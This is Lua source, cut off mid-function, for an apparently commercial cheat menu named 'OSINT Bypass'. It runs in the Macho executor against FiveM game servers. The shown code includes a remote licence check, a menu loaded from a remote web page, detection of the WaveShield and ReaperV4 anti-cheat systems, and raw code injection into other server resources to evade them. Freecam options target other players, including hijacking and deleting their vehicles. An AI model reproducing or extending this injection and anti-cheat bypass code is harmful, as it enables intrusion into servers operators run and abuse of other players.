MachoLockLogger(1)

local BUNDSIOFDSFUDHBSFUBSDOIFSDHJFUIYSDF = "jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd"
local function decodeConst(encoded, key)
    local decoded = ""
    for i = 1, #encoded do
        local byte = string.byte(encoded, i)
        decoded = decoded .. string.char((byte - key) % 256)
    end
    if DEBUG then
        local bytes = {}
        for i = 1, #decoded do
            bytes[i] = string.byte(decoded, i)
        end
        print("[OSINT BYPASS] Decoded bytes: " .. table.concat(bytes, ","))
    end
    return decoded
end

local AUTH_URL_A = "https://osintsolutions.org/rawtext"
local AUTH_URL_B = "https://osintsolutions.org/dih"
local DEBUG = false

local function simpleHash(str)
    local hash = 0
    for i = 1, #str do
        hash = (hash * 31 + string.byte(str, i)) % 2^32
    end
    return string.format("%x", hash)
end

local function trim(s)
    if not s then return nil end
    return (s:gsub("^%s*(.-)%s*$", "%1"))
end

local function fetchResponse(url)
    if DEBUG then
        print("[OSINT BYPASS] Attempting to fetch from: " .. url)
    end
    local ok, res = pcall(MachoWebRequest, url)
    if not ok or not res or res == "" then
        print("[OSINT BYPASS] Authentication failed: Could not fetch keys from " .. url)
        if DEBUG then
            print("[OSINT BYPASS] Error details: ok=" .. tostring(ok) .. ", res=" .. tostring(res))
        end
        return nil
    end
    res = tostring(res)
    if DEBUG then
        local preview = string.sub(res, 1, 300)
        print(string.format("[OSINT BYPASS] Fetched %d bytes from %s — preview: %s", #res, url, preview))
    end

    local content, signature = res:match("(.-)\nSignature:%s*(%x+)\n$")
    if not content or not signature then
        print("[OSINT BYPASS] Authentication failed: Invalid response format from " .. url)
        if DEBUG then
            print("[OSINT BYPASS] Raw response: " .. res)
        end
        return nil
    end

    if signature ~= simpleHash(content .. BUNDSIOFDSFUDHBSFUBSDOIFSDHJFUIYSDF) then
        print("[OSINT BYPASS] Authentication failed: Invalid response signature from " .. url)
        return nil
    end
    return content
end

local function parseVersionFromResponse(resp)
    if not resp then return nil end
    local patterns = {
        "[Vv]ersion%s*[:=]%s*([^\r\n]+)",
        "[Vv]ersion%s+([^\r\n]+)",
    }
    for _, pat in ipairs(patterns) do
        local v = resp:match(pat)
        if v then
            v = trim(v)
            v = (v:gsub("[%s%p]+$", ""))
            return v
        end
    end
    local line = resp:match("([^\r\n]*[Vv]ersion[^\r\n]*)")
    if line then
        local v = line:match("[Vv]ersion%s*[:=]?%s*([%w%._%-]+)")
        if v then return trim(v) end
    end
    return nil
end

local function createProtectedAuth()
    local currentVersion = "3.245454457843"
    if DEBUG then
        local bytes = {}
        for i = 1, #currentVersion do
            bytes[i] = string.byte(currentVersion, i)
        end
        print("[OSINT BYPASS] currentVersion bytes: " .. table.concat(bytes, ","))
    end
    local tamperCheck = simpleHash(currentVersion .. BUNDSIOFDSFUDHBSFUBSDOIFSDHJFUIYSDF)

    return function()
        if simpleHash(currentVersion .. BUNDSIOFDSFUDHBSFUBSDOIFSDHJFUIYSDF) ~= tamperCheck then
            print("[OSINT BYPASS] Authentication failed: Version tampering detected")
            return false
        end

        local currentKey = MachoAuthenticationKey()
        if not currentKey or currentKey == "" then
            print("[OSINT BYPASS] Authentication failed: No key found")
            return false
        end

        local respA = fetchResponse(AUTH_URL_A)
        if not respA then return false end
        local respB = fetchResponse(AUTH_URL_B)
        if not respB then return false end

        local verA = parseVersionFromResponse(respA)
        local verB = parseVersionFromResponse(respB)

        if DEBUG then
            print("[OSINT BYPASS] Parsed versions — rawtext: " .. tostring(verA) .. ", dih: " .. tostring(verB))
        end

        if not verA or not verB then
            print("[OSINT BYPASS] Authentication failed #1")
            return false
        end

        if verA ~= verB then
            print("[OSINT BYPASS] Authentication failed #2")
            return false
        end

        if verA ~= currentVersion then
            print("Authentication failed #4") 
            return false
        end

        local foundInA = respA:find(currentKey, 1, true) ~= nil
        local foundInB = respB:find(currentKey, 1, true) ~= nil

        if foundInA and foundInB then
            print("[OSINT BYPASS] Authentication successful: Key verified [" .. currentKey .. "] in both sources")
            return true
        else
            print("[OSINT BYPASS] Authentication failed")
            return false
        end
    end
end

local AuthenticateUser = createProtectedAuth()

if not AuthenticateUser() then
    print("[OSINT BYPASS] Access denied: Authentication required")
    return
end

---@diagnostic disable: undefined-global
local OSINT = {}
local IsVisible = false
local DUI = nil
local HoveredIndex = 1
local ActiveMenu = {}
local CurrentMenu = ActiveMenu
local CurrentCategories = nil
local CurrentCategoryIndex = 1
local MenuStack = {}
local MenuLabelStack = {}
local LastUIState = nil
local MenuKey = "H"
local MenuOpenable = false
local MenuKeybinds = {}
local ShiftHolding = false
local CPlayers = {}
local WeaponsLabels = { [GetHashKey('weapon_unarmed')] = 'Fists', [GetHashKey('weapon_knife')] = 'Knife', [GetHashKey('weapon_nightstick')] = 'Nightstick', [GetHashKey('weapon_hammer')] = 'Hammer', [GetHashKey('weapon_bat')] = 'Baseball Bat', [GetHashKey('weapon_golfclub')] = 'Golf Club', [GetHashKey('weapon_crowbar')] = 'Crowbar', [GetHashKey('weapon_pistol')] = 'Pistol', [GetHashKey('weapon_pistol_mk2')] = 'Pistol Mk II', [GetHashKey('weapon_snspistol_mk2')] = 'SNS Pistol Mk II', [GetHashKey('weapon_ceramicpistol')] = 'Ceramic Pistol', [GetHashKey('weapon_revolver_mk2')] = 'Heavy Revolver Mk II', [GetHashKey('weapon_doubleaction')] = 'Double-Action Revolver', [GetHashKey('weapon_gadgetpistol')] = 'Gadget Pistol', [GetHashKey('weapon_pistolxm3')] = 'WM 29 Pistol', [GetHashKey('weapon_combatpistol')] = 'Combat Pistol', [GetHashKey('weapon_appistol')] = 'AP Pistol', [GetHashKey('weapon_pistol50')] = 'Pistol .50', [GetHashKey('weapon_microsmg')] = 'Micro SMG', [GetHashKey('weapon_smg')] = 'SMG', [GetHashKey('weapon_assaultsmg')] = 'Assault SMG', [GetHashKey('weapon_assaultrifle')] = 'Assault Rifle', [GetHashKey('weapon_assaultrifle_mk2')] = 'Assault Rifle Mk II', [GetHashKey('weapon_specialcarbine_mk2')] = 'Special Carbine Mk II', [GetHashKey('weapon_bullpuprifle_mk2')] = 'Bullpup Rifle Mk II', [GetHashKey('weapon_militaryrifle')] = 'Military Rifle', [GetHashKey('weapon_tacticalrifle')] = 'Service Carbine', [GetHashKey('weapon_battlerifle')] = 'Battle Rifle', [GetHashKey('weapon_carbinerifle')] = 'Carbine Rifle', [GetHashKey('weapon_advancedrifle')] = 'Advanced Rifle', [GetHashKey('weapon_mg')] = 'MG', [GetHashKey('weapon_combatmg')] = 'Combat MG', [GetHashKey('weapon_pumpshotgun')] = 'Pump Shotgun', [GetHashKey('weapon_sawnoffshotgun')] = 'Sawed-Off Shotgun', [GetHashKey('weapon_assaultshotgun')] = 'Assault Shotgun', [GetHashKey('weapon_bullpupshotgun')] = 'Bullpup Shotgun', [GetHashKey('weapon_hackingdevice')] = 'Hacking Device', [GetHashKey('weapon_stungun')] = 'Stun Gun', [GetHashKey('weapon_stungun_mp')] = 'Stun Gun MP', [GetHashKey('weapon_sniperrifle')] = 'Sniper Rifle', [GetHashKey('weapon_heavysniper')] = 'Heavy Sniper', [GetHashKey('weapon_grenadelauncher')] = 'Grenade Launcher', [GetHashKey('weapon_rpg')] = 'RPG', [GetHashKey('weapon_minigun')] = 'Minigun', [GetHashKey('weapon_grenade')] = 'Grenade', [GetHashKey('weapon_stickybomb')] = 'Sticky Bomb', [GetHashKey('weapon_smokegrenade')] = 'Smoke Grenade', [GetHashKey('weapon_bzgas')] = 'BZ Gas', [GetHashKey('weapon_molotov')] = 'Molotov Cocktail', [GetHashKey('weapon_fireextinguisher')] = 'Fire Extinguisher', [GetHashKey('weapon_petrolcan')] = 'Jerry Can', [GetHashKey('weapon_ball')] = 'Baseball', [GetHashKey('weapon_snspistol')] = 'SNS Pistol', [GetHashKey('weapon_bottle')] = 'Broken Bottle', [GetHashKey('weapon_gusenberg')] = 'Gusenberg Sweeper', [GetHashKey('weapon_specialcarbine')] = 'Special Carbine', [GetHashKey('weapon_heavypistol')] = 'Heavy Pistol', [GetHashKey('weapon_bullpuprifle')] = 'Bullpup Rifle', [GetHashKey('weapon_dagger')] = 'Dagger', [GetHashKey('weapon_vintagepistol')] = 'Vintage Pistol', [GetHashKey('weapon_firework')] = 'Firework Launcher', [GetHashKey('weapon_musket')] = 'Musket', [GetHashKey('weapon_heavyshotgun')] = 'Heavy Shotgun', [GetHashKey('weapon_marksmanrifle')] = 'Marksman Rifle', [GetHashKey('weapon_hominglauncher')] = 'Homing Launcher', [GetHashKey('weapon_proxmine')] = 'Proximity Mines', [GetHashKey('weapon_snowball')] = 'Snowball', [GetHashKey('weapon_flaregun')] = 'Flare Gun', [GetHashKey('weapon_garbagebag')] = 'Garbage Bag', [GetHashKey('weapon_handcuffs')] = 'Handcuffs', [GetHashKey('weapon_combatpdw')] = 'Combat PDW', [GetHashKey('weapon_marksmanpistol')] = 'Marksman Pistol', [GetHashKey('weapon_knuckle')] = 'Knuckle Dusters', [GetHashKey('weapon_hatchet')] = 'Hatchet', [GetHashKey('weapon_railgun')] = 'Railgun', [GetHashKey('weapon_machinepistol')] = 'Machine Pistol', [GetHashKey('weapon_switchblade')] = 'Switchblade', [GetHashKey('weapon_revolver')] = 'Heavy Revolver', [GetHashKey('weapon_heavyrifle')] = 'Heavy Rifle', [GetHashKey('weapon_dbshotgun')] = 'Double Barrel Shotgun', [GetHashKey('weapon_compactrifle')] = 'Compact Rifle', [GetHashKey('weapon_battleaxe')] = 'Battle Axe', [GetHashKey('weapon_compactlauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_minismg')] = 'Mini SMG', [GetHashKey('weapon_pipebomb')] = 'Pipe Bomb', [GetHashKey('weapon_poolcue')] = 'Pool Cue', [GetHashKey('weapon_wrench')] = 'Wrench', [GetHashKey('weapon_autoshotgun')] = 'Sweeper Shotgun', [GetHashKey('weapon_bread')] = 'Piece of Bread', [GetHashKey('weapon_stone_hatchet')] = 'Stone Hatchet', [GetHashKey('weapon_rayminigun')] = 'Unholy Hellbringer', [GetHashKey('weapon_raycarbine')] = 'Widowmaker', [GetHashKey('weapon_compactgrenadelauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_smugglerpistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_raypistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_perico_pistol')] = 'Ceramic Pistol', [GetHashKey('weapon_carbinerifle_mk2')] = 'Carbine Rifle Mk II', [GetHashKey('weapon_combatmg_mk2')] = 'Combat MG Mk II', [GetHashKey('weapon_heavysniper_mk2')] = 'Heavy Sniper Mk II', [GetHashKey('weapon_marksmanrifle_mk2')] = 'Marksman Rifle Mk II', [GetHashKey('weapon_pumpshotgun_mk2')] = 'Pump Shotgun Mk II', [GetHashKey('weapon_smg_mk2')] = 'SMG Mk II', [GetHashKey('weapon_raycarbine_mk2')] = 'Widowmaker Mk II', [GetHashKey('weapon_machete')] = 'Machete', [GetHashKey('weapon_flashlight')] = 'Flashlight', [GetHashKey('weapon_hazardousknife')] = 'Hazardous Knife', [GetHashKey('weapon_navyrevolver')] = 'Navy Revolver', [GetHashKey('weapon_golfball')] = 'Golf Ball' }
local FirstInjectionPassed = false
local FreecamBypassReaperV4 = false
local FreecamInjected = false
local FreecamEnabled = false
local LastWeaponFired = nil
local CurrentWeaponIndex = 1
local CurrentVehicleIndex = 1
local FreecamWeaponList = { "WEAPON_APPISTOL", "WEAPON_PISTOL", "WEAPON_SMG", "WEAPON_ASSAULTRIFLE", "WEAPON_RPG", "WEAPON_PERMKILL", "WEAPON_AIRSTRIKE_ROCKET" }
local FreecamVehicleList = { "Adder", "Zentorno", "Comet", "Banshee", "Trash", "Dump" }
local FreecamOptions = { "Default", "Teleport", "Shoot Weapon", "Kick from Vehicle", "Hijack Vehicle", "Delete Vehicle" }
local FreecamHoveredIndex = 1
local IsFalling = false
local NoCollision = false
local DeletePrevious = false
local TeleportInto = false
local MappedKeys = {
    [27] = "Escape", [112] = "F1", [113] = "F2",
    [114] = "F3", [115] = "F4", [116] = "F5",
    [117] = "F6", [118] = "F7", [119] = "F8",
    [120] = "F9", [121] = "F10", [122] = "F11",
    [123] = "F12", [192] = "`",
    [49] = "1", [50] = "2", [51] = "3",
    [52] = "4", [53] = "5", [54] = "6",
    [55] = "7", [56] = "8", [57] = "9",
    [48] = "0", [189] = "-", [187] = "=",
    [8] = "Backspace", [9] = "Tab", [81] = "Q",
    [87] = "W", [69] = "E", [82] = "R",
    [84] = "T", [89] = "Y", [85] = "U",
    [73] = "I", [79] = "O", [80] = "P",
    [219] = "[", [221] = "]", [220] = "\\",
    [20] = "CapsLock", [65] = "A", [83] = "S",
    [68] = "D", [70] = "F", [71] = "G",
    [72] = "H", [74] = "J", [75] = "K",
    [76] = "L", [186] = ";", [222] = "'",
    [13] = "Enter", [16] = "Shift", [90] = "Z",
    [88] = "X", [67] = "C", [86] = "V",
    [66] = "B", [78] = "N", [77] = "M",
    [188] = ",", [190] = ".", [191] = "/",
    [17] = "Control", [46] = "Delete", [33] = "PageUp",
    [34] = "PageDown", [35] = "End", [36] = "Home",
    [38] = "ArrowUp", [40] = "ArrowDown", [37] = "ArrowLeft", [39] = "ArrowRight"
}

local VK_TO_FIVEM = {
    [27] = 322,    -- Escape
    [112] = 288,   -- F1
    [113] = 289,   -- F2
    [114] = 170,   -- F3
    [115] = 167,   -- F4
    [116] = 166,   -- F5
    [117] = 167,   -- F6
    [118] = 168,   -- F7
    [119] = 169,   -- F8
    [120] = 56,    -- F9
    [121] = 57,    -- F10
    [122] = 344,   -- F11
    [123] = 345,   -- F12
    [192] = 243,   -- `
    [49] = 157,    -- 1
    [50] = 158,    -- 2
    [51] = 160,    -- 3
    [52] = 164,    -- 4
    [53] = 165,    -- 5
    [54] = 159,    -- 6
    [55] = 161,    -- 7
    [56] = 162,    -- 8
    [57] = 163,    -- 9
    [48] = 82,     -- 0
    [189] = 84,    -- -
    [187] = 83,    -- =
    [8] = 177,     -- Backspace
    [9] = 37,      -- Tab
    [81] = 44,     -- Q
    [87] = 32,     -- W
    [69] = 46,     -- E
    [82] = 45,     -- R
    [84] = 245,    -- T
    [89] = 246,    -- Y
    [85] = 303,    -- U
    [73] = 74,     -- I
    [79] = 199,    -- O
    [80] = 7,      -- P
    [219] = 39,    -- [
    [221] = 40,    -- ]
    [220] = 36,    -- \
    [20] = 137,    -- CapsLock
    [65] = 34,     -- A
    [83] = 33,     -- S
    [68] = 30,     -- D
    [70] = 49,     -- F
    [71] = 47,     -- G
    [72] = 74,     -- H
    [74] = 311,    -- J
    [75] = 311,    -- K
    [76] = 7,      -- L
    [186] = 81,    -- ;
    [222] = 82,    -- '
    [13] = 18,     -- Enter
    [16] = 21,     -- Shift
    [90] = 20,     -- Z
    [88] = 73,     -- X
    [67] = 26,     -- C
    [86] = 0,      -- V
    [66] = 29,     -- B
    [78] = 249,    -- N
    [77] = 244,    -- M
    [188] = 82,    -- ,
    [190] = 81,    -- .
    [191] = 83,    -- /
    [17] = 36,     -- Control
    [46] = 178,    -- Delete
    [33] = 10,     -- PageUp
    [34] = 11,     -- PageDown
    [35] = 213,    -- End
    [36] = 213,    -- Home
    [38] = 27,     -- ArrowUp
    [40] = 173,    -- ArrowDown
    [37] = 174,    -- ArrowLeft
    [39] = 175     -- ArrowRight
}


local WeaponList = {
    -- Melee
    ["weapon_unarmed"] = {label = "Unarmed", hash = GetHashKey("weapon_unarmed")},
    ["weapon_knife"] = {label = "Knife", hash = GetHashKey("weapon_knife")},
    ["weapon_dagger"] = {label = "Dagger", hash = GetHashKey("weapon_dagger")},
    ["weapon_bat"] = {label = "Baseball Bat", hash = GetHashKey("weapon_bat")},
    ["weapon_bottle"] = {label = "Broken Bottle", hash = GetHashKey("weapon_bottle")},
    ["weapon_crowbar"] = {label = "Crowbar", hash = GetHashKey("weapon_crowbar")},
    ["weapon_golfclub"] = {label = "Golf Club", hash = GetHashKey("weapon_golfclub")},
    ["weapon_hammer"] = {label = "Hammer", hash = GetHashKey("weapon_hammer")},
    ["weapon_hatchet"] = {label = "Hatchet", hash = GetHashKey("weapon_hatchet")},
    ["weapon_machete"] = {label = "Machete", hash = GetHashKey("weapon_machete")},
    ["weapon_switchblade"] = {label = "Switchblade", hash = GetHashKey("weapon_switchblade")},
    ["weapon_nightstick"] = {label = "Nightstick", hash = GetHashKey("weapon_nightstick")},
    ["weapon_wrench"] = {label = "Wrench", hash = GetHashKey("weapon_wrench")},

    -- Handguns
    ["weapon_pistol"] = {label = "Pistol", hash = GetHashKey("weapon_pistol")},
    ["weapon_pistol_mk2"] = {label = "Pistol Mk II", hash = GetHashKey("weapon_pistol_mk2")},
    ["weapon_combatpistol"] = {label = "Combat Pistol", hash = GetHashKey("weapon_combatpistol")},
    ["weapon_appistol"] = {label = "AP Pistol", hash = GetHashKey("weapon_appistol")},
    ["weapon_stungun"] = {label = "Taser", hash = GetHashKey("weapon_stungun")},
    ["weapon_pistol50"] = {label = "Pistol .50", hash = GetHashKey("weapon_pistol50")},
    ["weapon_snspistol"] = {label = "SNS Pistol", hash = GetHashKey("weapon_snspistol")},
    ["weapon_heavypistol"] = {label = "Heavy Pistol", hash = GetHashKey("weapon_heavypistol")},
    ["weapon_vintagepistol"] = {label = "Vintage Pistol", hash = GetHashKey("weapon_vintagepistol")},
    ["weapon_flaregun"] = {label = "Flare Gun", hash = GetHashKey("weapon_flaregun")},

    -- SMGs
    ["weapon_microsmg"] = {label = "Micro SMG", hash = GetHashKey("weapon_microsmg")},
    ["weapon_smg"] = {label = "SMG", hash = GetHashKey("weapon_smg")},
    ["weapon_smg_mk2"] = {label = "SMG Mk II", hash = GetHashKey("weapon_smg_mk2")},
    ["weapon_assaultsmg"] = {label = "Assault SMG", hash = GetHashKey("weapon_assaultsmg")},
    ["weapon_machinepistol"] = {label = "Machine Pistol", hash = GetHashKey("weapon_machinepistol")},
    ["weapon_minismg"] = {label = "Mini SMG", hash = GetHashKey("weapon_minismg")},
    ["weapon_combatpdw"] = {label = "Combat PDW", hash = GetHashKey("weapon_combatpdw")},

    -- Rifles
    ["weapon_assaultrifle"] = {label = "Assault Rifle", hash = GetHashKey("weapon_assaultrifle")},
    ["weapon_assaultrifle_mk2"] = {label = "Assault Rifle Mk II", hash = GetHashKey("weapon_assaultrifle_mk2")},
    ["weapon_carbinerifle"] = {label = "Carbine Rifle", hash = GetHashKey("weapon_carbinerifle")},
    ["weapon_carbinerifle_mk2"] = {label = "Carbine Rifle Mk II", hash = GetHashKey("weapon_carbinerifle_mk2")},
    ["weapon_advancedrifle"] = {label = "Advanced Rifle", hash = GetHashKey("weapon_advancedrifle")},
    ["weapon_specialcarbine"] = {label = "Special Carbine", hash = GetHashKey("weapon_specialcarbine")},
    ["weapon_bullpuprifle"] = {label = "Bullpup Rifle", hash = GetHashKey("weapon_bullpuprifle")},
    ["weapon_bullpuprifle_mk2"] = {label = "Bullpup Rifle Mk II", hash = GetHashKey("weapon_bullpuprifle_mk2")},
    ["weapon_compactrifle"] = {label = "Compact Rifle", hash = GetHashKey("weapon_compactrifle")},
    ["weapon_marksmanrifle"] = {label = "Marksman Rifle", hash = GetHashKey("weapon_marksmanrifle")},

    -- Shotguns
    ["weapon_pumpshotgun"] = {label = "Pump Shotgun", hash = GetHashKey("weapon_pumpshotgun")},
    ["weapon_pumpshotgun_mk2"] = {label = "Pump Shotgun Mk II", hash = GetHashKey("weapon_pumpshotgun_mk2")},
    ["weapon_sawnoffshotgun"] = {label = "Sawed-Off Shotgun", hash = GetHashKey("weapon_sawnoffshotgun")},
    ["weapon_assaultshotgun"] = {label = "Assault Shotgun", hash = GetHashKey("weapon_assaultshotgun")},
    ["weapon_bullpupshotgun"] = {label = "Bullpup Shotgun", hash = GetHashKey("weapon_bullpupshotgun")},
    ["weapon_heavyshotgun"] = {label = "Heavy Shotgun", hash = GetHashKey("weapon_heavyshotgun")},
    ["weapon_autoshotgun"] = {label = "Auto Shotgun", hash = GetHashKey("weapon_autoshotgun")},

    -- Snipers
    ["weapon_sniperrifle"] = {label = "Sniper Rifle", hash = GetHashKey("weapon_sniperrifle")},
    ["weapon_heavysniper"] = {label = "Heavy Sniper", hash = GetHashKey("weapon_heavysniper")},
    ["weapon_heavysniper_mk2"] = {label = "Heavy Sniper Mk II", hash = GetHashKey("weapon_heavysniper_mk2")},
    ["weapon_marksmanrifle_mk2"] = {label = "Marksman Rifle Mk II", hash = GetHashKey("weapon_marksmanrifle_mk2")},

    -- Explosives / Launchers
    ["weapon_grenade"] = {label = "Grenade", hash = GetHashKey("weapon_grenade")},
    ["weapon_stickybomb"] = {label = "Sticky Bomb", hash = GetHashKey("weapon_stickybomb")},
    ["weapon_molotov"] = {label = "Molotov Cocktail", hash = GetHashKey("weapon_molotov")},
    ["weapon_pipebomb"] = {label = "Pipe Bomb", hash = GetHashKey("weapon_pipebomb")},
    ["weapon_proxmine"] = {label = "Proximity Mine", hash = GetHashKey("weapon_proxmine")},
    ["weapon_rpg"] = {label = "RPG", hash = GetHashKey("weapon_rpg")},
    ["weapon_grenadelauncher"] = {label = "Grenade Launcher", hash = GetHashKey("weapon_grenadelauncher")},
    ["weapon_hominglauncher"] = {label = "Homing Launcher", hash = GetHashKey("weapon_hominglauncher")},
    ["weapon_minigun"] = {label = "Minigun", hash = GetHashKey("weapon_minigun")},
    ["weapon_railgun"] = {label = "Railgun", hash = GetHashKey("weapon_railgun")},

    -- Throwables / Misc
    ["weapon_ball"] = {label = "Baseball", hash = GetHashKey("weapon_ball")},
    ["weapon_smokegrenade"] = {label = "Smoke Grenade", hash = GetHashKey("weapon_smokegrenade")},
    ["weapon_flare"] = {label = "Flare", hash = GetHashKey("weapon_flare")},
    ["weapon_petrolcan"] = {label = "Jerry Can", hash = GetHashKey("weapon_petrolcan")},
    ["weapon_bzgas"] = {label = "BZ Gas", hash = GetHashKey("weapon_bzgas")}
}

local InjectionType = GetResourceState("WaveShield") == "started" and "Raw" or "Default" -- MachoInjectResource | MachoInjectResourceRaw
local Injection = InjectionType == "Raw" and MachoInjectResourceRaw or MachoInjectResource

---@param text string
function OSINT:Debug(color, text)
    local debugColors = { ["red"] = "^1", ["yellow"] = "^3", ["green"] = "^2", ["info"] = "^5" }
    local debugColor = debugColors[color] or "^5"
    print(("^7[^5OSINT^7]: [%sDEBUG^7] >> %s"):format(debugColor, text))
end

---@param data table
function OSINT:SendMessage(data)
    if not DUI or not data or type(data) ~= "table" then
        return
    end

    MachoSendDuiMessage(DUI, json.encode(data))
end

---@param type "success"|"error"|"info"
---@param title string
---@param desc string
---@param duration number
function OSINT:Notify(type, title, desc, duration)
    self:SendMessage({ action = "showNotification", type = type, title = title, desc = desc, duration = duration })
end

function OSINT:GetMenuPath()
    local path = { "OSINT" }

    for i = 1, #MenuLabelStack do
        table.insert(path, MenuLabelStack[i])
    end

    return path
end

---@param elements table
function OSINT:UpdateElements(elements)
    if not elements or type(elements) ~= "table" then
        return
    end

    local payload = {
        action = "updateElements",
        elements = elements,
        index = HoveredIndex - 1,
        path = self:GetMenuPath()
    }

    if CurrentCategories and type(CurrentCategories) == "table" and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = (CurrentCategoryIndex or 1) - 1
    end

    self:SendMessage(payload)
end

function OSINT:Initialize()
    DUI = MachoCreateDui("https://dih-djl-pages.js5228215.workers.dev/")
    if DUI then
        self:Debug("yellow", "Creating & Initializing DUI...")
        MachoShowDui(DUI)
        self:Debug("green", "DUI Created & Initialized Successfully!")
    else
        self:Debug("red", "Failed to Create DUI")
    end
end

function OSINT:HideUI(keepState)
    if keepState then
        LastUIState = {
            currentMenu = CurrentMenu,
            hoveredIndex = HoveredIndex,
            menuStack = MenuStack,
            menuLabelStack = MenuLabelStack,
            currentCategories = CurrentCategories,
            currentCategoryIndex = CurrentCategoryIndex
        }
    else
        LastUIState = nil
    end

    IsVisible = false
    self:SendMessage({ action = "keydown", index = 0 })
    self:SendMessage({ action = "showUI", visible = false, index = 0 })
end

function OSINT:ShowUI()
    IsVisible = true

    if LastUIState then
        CurrentMenu = LastUIState.currentMenu
        HoveredIndex = LastUIState.hoveredIndex
        MenuStack = LastUIState.menuStack
        MenuLabelStack = LastUIState.menuLabelStack
        CurrentCategories = LastUIState.currentCategories
        CurrentCategoryIndex = LastUIState.currentCategoryIndex
        LastUIState = nil
    else
        HoveredIndex = 1
        CurrentMenu = ActiveMenu
        CurrentCategories = nil
        CurrentCategoryIndex = 1
        MenuStack = {}
        MenuLabelStack = {}
    end

    local payload = {
        action = "showUI",
        visible = true,
        elements = CurrentMenu,
        index = HoveredIndex - 1,
        path = self:GetMenuPath(),
        username = Username or "OSINTBypass"
    }

    if CurrentCategories and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = CurrentCategoryIndex - 1
    end

    self:SendMessage(payload)
end

function OSINT:IsShiftHeld()
    return ShiftHolding
end

MachoOnKeyDown(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = true
    end
end)

MachoOnKeyUp(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = false
    end
end)

local CurrentKeyboardInput = nil

local function KeyboardInput(Title, Value, OnConfirm, InputType)
    if CurrentKeyboardInput then return end

    CurrentKeyboardInput = {
        title = Title,
        buffer = Value or "",
        maxLength = 32,
        onConfirm = OnConfirm,
        type = InputType or "typeable",
        closeable = InputType == "keybind" and false or true,
        active = true
    }

    MachoSendDuiMessage(DUI, json.encode({ 
        action = "updateKeyboard", 
        visible = true, 
        title = Title, 
        value = CurrentKeyboardInput.buffer 
    }))

    if GetResourceState("WaveShield") == "started" then
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("ReaperV4") == "started" then
        -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
    else
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]])
    end

    Wait(250)
    OSINT:HideUI(true)
    MenuOpenable = false
end


MachoOnKeyDown(function(vk)
    if not CurrentKeyboardInput or not CurrentKeyboardInput.active then return end
    
    if vk == 0x0D then -- Enter
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        if CurrentKeyboardInput.onConfirm then
            CurrentKeyboardInput.onConfirm(CurrentKeyboardInput.buffer)
        end

    if GetResourceState("WaveShield") == "started" then
        MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
    elseif GetResourceState("ReaperV4") == "started" then
        -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
    else
        MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
    end

        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    elseif vk == 0x08 then -- Backspace
        if CurrentKeyboardInput.type == "typeable" then
            CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer:sub(1, -2)
        else
            CurrentKeyboardInput.buffer = ""
        end
    elseif vk == 0x1B then -- Escape
        if not CurrentKeyboardInput.closeable then
            return
        end

        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
        else
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]])
        end
        
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    else
        if CurrentKeyboardInput.type == "keybind" then
            local keyName = MappedKeys[vk]
            if keyName then
                if CurrentKeyboardInput.buffer ~= keyName then
                    CurrentKeyboardInput.buffer = keyName
                end
            end
        elseif CurrentKeyboardInput.type == "typeable" then
            local AllowedChars = {
                [0x30] = "0", [0x31] = "1", [0x32] = "2", [0x33] = "3", [0x34] = "4",
                [0x35] = "5", [0x36] = "6", [0x37] = "7", [0x38] = "8", [0x39] = "9",
                [0x41] = "A", [0x42] = "B", [0x43] = "C", [0x44] = "D", [0x45] = "E",
                [0x46] = "F", [0x47] = "G", [0x48] = "H", [0x49] = "I", [0x4A] = "J",
                [0x4B] = "K", [0x4C] = "L", [0x4D] = "M", [0x4E] = "N", [0x4F] = "O",
                [0x50] = "P", [0x51] = "Q", [0x52] = "R", [0x53] = "S", [0x54] = "T",
                [0x55] = "U", [0x56] = "V", [0x57] = "W", [0x58] = "X", [0x59] = "Y",
                [0x5A] = "Z", [0xBD] = "-", [0xBB] = "=", [0xBC] = ",", [0xBE] = ".",
                [0xBA] = ";", [0xDE] = "'", [0xBF] = "/", [0xC0] = "`", [0x20] = " "
            }

            local char = AllowedChars[vk]
            if char and #CurrentKeyboardInput.buffer < CurrentKeyboardInput.maxLength then
                if OSINT:IsShiftHeld() then
                    if char:match("%a") then
                        char = char:upper()
                    elseif char == "-" then
                        char = "_"
                    end
                else
                    if char:match("%a") then
                        char = char:lower()
                    end
                end

                CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer .. char
            end
        end
    end

    if CurrentKeyboardInput then
        MachoSendDuiMessage(DUI, json.encode({
            action = "updateKeyboard",
            visible = true,
